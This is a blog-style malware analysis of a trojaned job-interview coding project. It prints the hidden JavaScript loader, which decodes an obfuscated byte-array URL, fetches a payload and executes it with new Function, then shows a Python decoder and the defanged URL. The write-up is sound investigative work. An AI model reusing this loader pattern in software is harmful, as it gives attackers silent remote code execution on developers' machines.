---
layout: default
title: "That Hiring Thing - Research Landing"
---

# That Hiring Thing

David Dodda recently wrote about how he was almost compromised in an interview. I wasn't satisfied how that story ended, I wanted more. I wanted everything. I wanted to know where the story goes, and who's involved.

I am not a security researcher in any formal or professional sense, you should trust no one -- but evidence is evidence, and this is the journey of analyzing this malware, uncovering the indicators, and how those indicators point to ______ (APT). Trying to reproduce this work is dangerous, and I'm hopeful that you won't be able to when we go into the corresponding command-and-control infrastructure takedown methodology.

## Step 1

David Dodda's blog is here: [How I Almost Got Hacked by a Job Interview](https://blog.daviddodda.com/how-i-almost-got-hacked-by-a-job-interview)


Ignoring the other threat of using AI in untrusted codebases, David had AI take a look for threats before he ran the code. Smart. It points out this codeblock:

```javascript
//Get Cookie
(async () => {
    const byteArray = [
        104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 110, 112, 111, 105,
        110, 116, 46, 105, 111, 47, 50, 99, 52, 53, 56, 54, 49, 50, 51, 57, 99, 51,
        98, 50, 48, 51, 49, 102, 98, 57
    ];
    const uint8Array = new Uint8Array(byteArray);
    const decoder = new TextDecoder('utf-8');
    axios.get(decoder.decode(uint8Array))
        .then(response => {
            new Function("require", response.data.model)(require);
        })
        .catch(error => { });
})();
```

What did your really save yourself from? The post-exploit analysis was weak, but I still love you. You stopped at a sensible boundary, a little beyond this point. You won my curiousity, and I'll start here for this write up.

With the `axios.get`, and `response.data.model` -- we can make the leap that the bytes are ascii chars for a URL that has a json payload with a `model` field. Let's get the URL.


```python
#!/usr/bin/env python3
"""
Byte array decoder for malware analysis
Decodes the byte array from the interview malware scheme
"""

# Byte array from the malware sample
byte_array = [
    104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 110, 112, 111, 105,
    110, 116, 46, 105, 111, 47, 50, 99, 52, 53, 56, 54, 49, 50, 51, 57, 99, 51,
    98, 50, 48, 51, 49, 102, 98, 57
]

# Decode the bytes to string
decoded_url = bytes(byte_array).decode('utf-8')

print(f"Decoded URL: {decoded_url}")

# Defanged version for safe display
defanged_url = decoded_url.replace('.', '[.]')
print(f"Defanged URL: {defanged_url}")
```

```
Defanged URL: https://api[.]npoint[.]io/2c45861239c3b2031fb9
```

We remove the teeth from URLs and IP addresses. We don't know the danger they pose and we don't want software being all cute and loading previews and hitting these machines. This can give up our home IP addresses to unknown threats.

